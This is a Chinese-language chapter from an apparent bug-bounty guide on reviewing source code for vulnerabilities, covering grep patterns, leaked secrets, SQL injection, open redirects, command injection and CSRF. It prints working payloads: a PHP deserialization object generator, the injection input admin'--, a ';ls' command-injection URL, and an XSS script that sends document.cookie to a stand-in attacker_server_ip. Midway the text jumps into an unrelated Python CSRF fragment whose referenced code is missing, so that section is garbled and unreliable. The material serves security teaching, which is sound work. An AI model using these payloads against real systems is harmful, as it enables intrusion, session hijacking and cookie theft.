# 第22章：进行代码审查（Conducting Code Reviews）

你有时会遇到正在攻击的应用程序的源代码。例如，你可能能够从Web应用程序中提取JavaScript代码，在侦察过程中找到存储在服务器上的脚本，或从Android应用程序中获得Java源代码。如果是这样，你很幸运！审查代码是在应用程序中发现漏洞的最佳方法之一。

不同于通过尝试不同的载荷和攻击来测试应用程序，你可以直接在应用程序的源代码中寻找漏洞来定位不安全的编程。源代码审查不仅是发现漏洞的更快方式，还能帮助你学习将来如何安全地编程，因为你会观察到他人的错误。

通过学习漏洞如何在源代码中表现出来，你可以培养对漏洞发生方式和原因的直觉。学会进行源代码审查最终将帮助你成为更好的黑客。

本章介绍一些策略，帮助你开始审查代码。我们将涵盖你应该寻找什么，并通过示例练习让你入门。

记住，大多数时候，你不必成为特定语言的编程大师就能进行代码审查。只要你理解一种编程语言，你就可以运用你的直觉来审查用不同语言编写的各种软件。但理解目标的特定语言和架构将使你能够发现更细微的漏洞。

> **注意**：如果你有兴趣学习超越本章提及策略的代码审查知识，OWASP代码审查指南（https://owasp.org/www-project-code-review-guide/）是一个全面的参考资源。

## 白盒与黑盒测试

你可能听说过网络安全行业的人提到黑盒和白盒测试。**黑盒测试**是从外到内测试软件。像现实中的攻击者一样，这些测试者对应用程序的内部逻辑了解甚少。相比之下，在**灰盒测试**中，测试者对应用程序的内部有有限的了解。在白盒审查中，测试者可以完全访问软件的源代码和文档。

通常，漏洞赏金狩猎是一个黑盒过程，因为你无法访问应用程序的源代码。但如果你能识别应用程序的开源组件或找到其源代码，你可以将狩猎转换为更有利的灰盒或白盒测试。

## 快速方法：grep 是你最好的朋友

有几种方法可以在源代码中寻找漏洞，取决于你想要多彻底。我们将从所谓的“能拿多少拿多少”策略开始。如果你想在短时间内最大化发现漏洞的数量，这种方法效果很好。这些技术速度快，通常能发现一些最严重的漏洞，但它们往往会遗漏更细微的漏洞。

### 危险模式

使用`grep`命令，查找已知危险的特定函数、字符串、关键字和编码模式。例如，在PHP中使用`eval()`函数可能表明存在代码注入漏洞。

为了说明这一点，假设你搜索`eval()`并找到以下代码片段：

```php
<?php
[...]
class UserFunction
{
    private $hook;
    function __construct(){
        [...]
    }
    function __wakeup(){
        ① if (isset($this->hook)) eval($this->hook);
    }
[...]
② $user_data = unserialize($_COOKIE['data']);
[...]
?>
```

在此示例中，`$_COOKIE['data']` ② 检索名为`data`的用户Cookie。`eval()`函数 ① 执行传入字符串所代表的PHP代码。综合起来，这段代码获取名为`data`的用户Cookie并对其进行反序列化。应用程序还定义了一个名为`UserFunction`的类，当反序列化时，它对实例的`$hook`属性中存储的字符串执行`eval()`。

此代码包含一个不安全的反序列化漏洞，导致RCE。这是因为应用程序从用户Cookie获取用户输入，并将其直接插入`unserialize()`函数。结果，用户可以通过构造序列化对象并将其传递到`data` Cookie中，使`unserialize()`实例化应用程序可访问的任何类。

你可以利用此反序列化缺陷实现RCE，因为它将用户提供的对象传递到`unserialize()`，而`UserFunction`类对用户提供的输入运行`eval()`，这意味着用户可以使应用程序执行任意用户代码。要利用此RCE，你只需将`data` Cookie设置为序列化的`UserFunction`对象，并将`hook`属性设置为你想要的任何PHP代码。你可以使用以下代码生成序列化对象：

```php
<?php
class UserFunction
{
    private $hook = "phpinfo();";
}
print urlencode(serialize(new UserFunction));
?>
```

将生成的字符串传递到`data` Cookie中将导致执行`phpinfo();`代码。此示例取自OWASP的PHP对象注入指南：https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection。你可以在第14章了解更多关于不安全反序列化漏洞的信息。

当你刚开始审查源代码时，专注于搜索在用户控制数据上使用的危险函数。表22-1列出了一些需要注意的危险函数示例。这些函数的存在并不保证存在漏洞，但可以提醒你可能存在漏洞。

### 泄露的秘密和弱加密

查找泄露的秘密和凭据。有时开发人员会犯将API密钥、加密密钥和数据库密码等秘密硬编码到源代码中的错误。当该源代码泄露给攻击者时，攻击者可以使用这些凭据访问公司的资产。例如，我曾在Web应用程序的JavaScript文件中发现硬编码的API密钥。

你可以通过`grep`关键字（如`key`、`secret`、`password`、`encrypt`、`API`、`login`或`token`）来查找这些问题。你也可以根据你正在寻找的凭据的密钥格式，使用正则表达式搜索十六进制或base64字符串。例如，GitHub访问令牌是小写40字符的十六进制字符串。像`[a-f0-9]{40}`这样的搜索模式可以在源代码中找到它们。此搜索模式匹配长度为40个字符且仅包含数字和十六进制字母a到f的字符串。

在搜索时，你可能会找到如下Python编写的代码片段：

```python
import requests

① GITHUB_ACCESS_TOKEN = "0518fb3b4f52a1494576eee7ed7c75ae8948ce70"
headers = {"Authorization": "token {}".format(GITHUB_ACCESS_TOKEN),
           "Accept": "application/vnd.github.v3+json"}
api_host = "https://api.github.com"
② usernames = ["vickie"] # List users to analyze

def request_page(path):
    resp = requests.Response()
    try: resp = requests.get(url=path, headers=headers, timeout=15, verify=False)
    except: pass
    return resp.json()

③ def find_repos():
    # Find repositories owned by the users.
    for username in usernames:
        path = "{}/users/{}/repos".format(api_host, username)
        resp = request_page(path)
        for repo in resp:
            print(repo["name"])

if __name__ == "__main__":
    find_repos()
```

此Python程序从GitHub获取用户名 ② 并打印出用户所有仓库的名称 ③。这可能是一个用于监控组织资产的内部脚本。但此代码包含硬编码凭据，因为开发人员将GitHub访问令牌硬编码到源代码中 ①。一旦源代码泄露，API密钥就成为公开信息。

**熵扫描**可以帮助你查找不符合特定格式的秘密。在计算中，熵是对事物随机性和不可预测性的度量。例如，仅由一个重复字符组成的字符串（如`aaaaa`）具有非常低的熵。具有更大字符集的较长字符串（如`wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`）具有更高的熵。因此，熵是查找高度随机和复杂字符串的好工具，这通常表示秘密。Dylan Ayrey的TruffleHog（https://github.com/trufflesecurity/truffleHog/）是一个使用正则表达式和熵扫描来搜索秘密的工具。

最后，查找弱加密或哈希算法的使用。此问题在黑盒测试中很难发现，但在审查源代码时容易发现。查找弱加密密钥、可破解加密算法和弱哈希算法等问题。`grep`弱算法的名称，如`ECB`、`MD4`和`MD5`。应用程序可能有以这些算法命名的函数，如`ecb()`、`create_md4()`或`md5_hash()`。它也可能有以算法名称命名的变量，如`ecb_key`等。弱哈希算法的影响取决于它们的使用位置。如果它们用于哈希不被认为安全敏感的值，其影响将小于用于哈希密码的情况。

### 新补丁和过时的依赖项

如果你可以访问源代码的提交或变更历史，你也可以将注意力集中在最近的代码修复和安全补丁上。最近的变更没有经受时间的考验，更可能包含错误。查看实施的保护机制，看看你是否可以绕过它们。

同时搜索程序的依赖项，检查是否有任何依赖项已过时。使用你正在使用的语言中的特定代码导入函数（如`import`、`require`和`dependencies`等关键字）进行`grep`。然后研究它们使用的版本，查看CVE数据库（https://cve.mitre.org/）中是否有与这些版本相关的漏洞。扫描应用程序中易受攻击依赖项的过程称为**软件成分分析（SCA）**。OWASP Dependency-Check工具（https://owasp.org/www-project-dependency-check/）可以帮助你自动化此过程。也有功能更强大的商业工具。

### 开发者注释

你还应该查找开发者注释和隐藏的调试功能，以及意外暴露的配置文件。这些是开发人员经常忘记的资源，它们使应用程序处于危险状态。

开发者注释可以指出明显的编程错误。例如，一些开发人员喜欢在代码中添加注释来提醒自己未完成的任务。他们可能写出像这样的注释，指出代码中的漏洞：

```php
# todo: Implement CSRF protection on the change_password endpoint.
```

你可以通过搜索每种编程语言的注释字符来查找开发者注释。在Python中，它是`#`。在Java、JavaScript和C++中，它是`//`。你也可以在源代码中搜索`todo`、`fix`、`completed`、`config`、`setup`和`removed`等术语。

### 调试功能、配置文件和端点

隐藏的调试功能常常导致权限提升，因为它们旨在让开发人员自己绕过保护机制。你通常可以在特殊端点找到它们，因此搜索如`HTTP`、`HTTPS`、`FTP`和`dev`等字符串。例如，你可能在代码中的某处找到一个指向管理面板的URL：

```
http://dev.example.com/admin?debug=1&password=password # Access debug panel
```

配置文件允许你获得有关目标应用程序的更多信息，并可能包含凭据。你也可以在源代码中查找配置文件的文件路径。配置文件通常具有文件扩展名`.conf`、`.env`、`.cnf`、`.cfg`、`.cf`、`.ini`、`.sys`或`.plist`。

接下来，查找额外的路径、废弃端点和开发中的端点。这些是用户在正常使用应用程序时可能不会遇到的端点。但如果它们有效并被攻击者发现，根据暴露的端点不同，可能导致身份验证绕过和敏感信息泄露等漏洞。你可以搜索指示URL的字符串和字符，如`HTTP`、`HTTPS`、斜杠（`/`）、URL参数标记（`?`）、文件扩展名（`.php`、`.html`、`.js`、`.json`）等。

## 详细方法

如果你有更多时间，用更广泛的源代码审查来补充快速技术，以发现细微漏洞。不必逐行阅读整个代码库，尝试以下策略以最大化效率。

### 重要函数

在阅读源代码时，关注重要函数，如身份验证、密码重置、状态更改操作和敏感信息读取。例如，你需要仔细查看这个用Python编写的登录函数：

```python
def login():
    query = "SELECT * FROM users WHERE username = '" + \
            ① request.username + "' AND password = '" + \
            request.password + "';"
    authed_user = database_call(query)
    ② login_as(authed_user)
```

此函数通过使用由用户提供的用户名和密码构建的SQL查询在数据库中查找用户 ①。如果存在具有指定用户名和密码的用户，则函数登录该用户 ②。

此代码包含一个经典的SQL注入漏洞示例。在①处，应用程序使用用户输入来构造SQL查询，但未以任何方式清理输入。攻击者可以通过输入`admin'--`作为用户名来构造攻击，以admin用户身份登录。这是因为查询将变为：

```sql
SELECT password FROM users WHERE username = 'admin' --' AND password = '';
```

应用程序的哪些部分重要取决于组织的优先级。同时审查重要组件如何与应用程序的其他部分交互。这将向你展示攻击者的输入如何影响应用程序的不同部分。

### 用户输入

另一种方法是仔细阅读处理用户输入的代码。用户输入（如HTTP请求参数、HTTP头、HTTP请求路径、数据库条目、文件读取和文件上传）为攻击者利用应用程序漏洞提供了入口点。这可以帮助发现常见漏洞，如存储型XSS、SQL注入和XXE。

关注处理用户输入的代码部分将为识别潜在危险提供良好的起点。确保同时审查用户输入如何被存储或传输。最后，查看应用程序的其他部分是否使用了先前处理的用户输入。你可能会发现相同的用户输入与应用程序的不同组件有不同的交互方式。

例如，以下代码片段接受用户输入。PHP变量`$_GET`包含在URL查询字符串中提交的参数，因此变量`$_GET['next']`指的是名为`next`的URL查询参数的值：

```php
<?php
[...]
if ($logged_in){
    ① $redirect_url = $_GET['next'];
    ② header("Location: ". $redirect_url);
    exit;
}
[...]
?>
```

此参数存储在`$redirect_url`变量中 ①。然后`header()` PHP函数将响应头`Location`设置为该变量 ②。`Location`头控制浏览器将用户重定向到哪里。这意味着用户将被重定向到`next` URL参数中指定的位置。

此代码片段中的漏洞是开放重定向。`next` URL查询参数用于在登录后重定向用户，但应用程序在重定向用户之前未验证重定向URL。它只是获取URL查询参数`next`的值并相应地设置响应头。

即使此功能的更强健版本也可能包含漏洞。查看以下代码片段：

```php
<?php
[...]
if ($logged_in){
    $redirect_url = $_GET['next'];
    ① if preg_match("/example.com/", $redirect_url){
        header("Location: ". $redirect_url);
        exit;
    }
}
[...]
?>
```

现在代码包含一些输入验证：`preg_match(PATTERN, STRING)` PHP函数检查`STRING`是否匹配正则表达式模式`PATTERN` ①。据推测，此模式将确保页面重定向到合法位置。但此代码仍然包含开放重定向。虽然应用程序现在在重定向用户之前验证了重定向URL，但做得不完整。它只检查重定向URL是否包含字符串`example.com`。如第7章所述，攻击者可以轻松通过使用`attacker.com/example.com`或`example.com.attacker.com`等重定向URL来绕过此保护。

让我们看另一个跟踪用户输入可以指向漏洞的实例。`parse_url(URL, COMPONENT)` PHP函数解析URL并返回指定的URL组件。例如，此函数将返回字符串`/index.html`。在这种情况下，它返回`PHP_URL_PATH`，即输入URL的文件路径部分：

```php
parse_url("https://www.example.com/index.html", PHP_URL_PATH)
```

你能发现以下PHP代码中的漏洞吗？

```php
<?php
[...]
① $url_path = parse_url($_GET['download_file'], PHP_URL_PATH);
② $command = 'wget -o stdout https://example.com' . $url_path;
③ system($command, $output);
④ echo "<h1> You requested the page:" . $url_path . "</h1>";
echo $output;
[...]
?>
```

此页面包含命令注入漏洞和反射型XSS漏洞。你可以通过关注应用程序在哪里使用了用户提供的`download_file`参数来发现它们。

假设此页面位于`https://example.com/download`。此代码检索`download_file` URL查询参数并解析URL以检索其路径组件 ①。然后服务器下载位于example.com服务器上、文件路径与`download_file` URL中的路径匹配的文件 ②。例如，访问此URL将下载文件`https://example.com/abc`：

```
https://example.com/download?download_file=https://example.com/abc
```

PHP `system()`命令执行系统命令，`system(COMMAND, OUTPUT)`将`COMMAND`的输出存储到变量`OUTPUT`中。此程序将用户输入传递给变量`$command`，然后传递给`system()`函数 ③。这意味着用户可以通过将他们的载荷注入`$url_path`来执行任意代码。他们只需在请求页面时干扰`download_file` GET参数，如下所示：

```
https://example.com/download?download_file=https://example.com/download;ls
```

然后应用程序使用直接用户输入在网页上显示消息 ④。攻击者可以在`download_file`的URL路径部分嵌入XSS载荷，并在受害用户访问精心构造的URL后将其反射到受害者页面上。可以利用此代码片段生成利用URL。（注意，第二行为了显示目的换行到第三行。）

```php
<?php
$exploit_string = "<script>document.location='http://attacker_server_ip/cookie_stealer.php?c='+document.cookie;</script>";
echo "https://example.com/" . $exploit_string;
?>
```

```python
        throw_error("Referer incorrect. Request rejected.")

if __name__ == "__main__":
    validate_referer()
    get_data_from_input(self.request.url)
    new_password_request(api_path, user_data)
```

让我们从考虑此程序的工作原理开始。它应该接受`new_password` URL参数来为用户设置新密码。它解析URL参数以获取`new_password`和`csrf_token`。然后，它验证CSRF令牌并执行POST请求以更改用户密码。

此程序存在多个问题。首先，它包含几个揭示性的开发者注释 ①。它指出更改用户密码的请求是通过GET请求发起的，用户的密码和CSRF令牌都在URL中传递。在URL中传输秘密是不好的做法，因为它们可能暴露给浏览器历史记录、浏览器扩展程序和流量分析提供商。这为攻击者窃取这些秘密创造了可能性。接下来，另一个开发者注释指出更改密码不需要用户的当前密码！第三个揭示性注释向攻击者指出CSRF Referer检查功能不完整 ④。

你可以自己看到程序使用了两种类型的CSRF保护，但都不完整。Referer检查函数只检查Referer是否存在，而不检查Referer URL是否来自合法站点 ③。接下来，站点实施了不完整的CSRF令牌验证。它只在URL中提供了`csrf_token`参数时才检查CSRF令牌是否有效 ②。攻击者只需向用户提供一个没有`csrf_token`参数或包含空白`csrf_token`的URL，就能执行CSRF更改用户密码，如下例所示：

```
https://example.com/change_password?new_password=abc&csrf_token=
https://example.com/change_password?new_password=abc
```
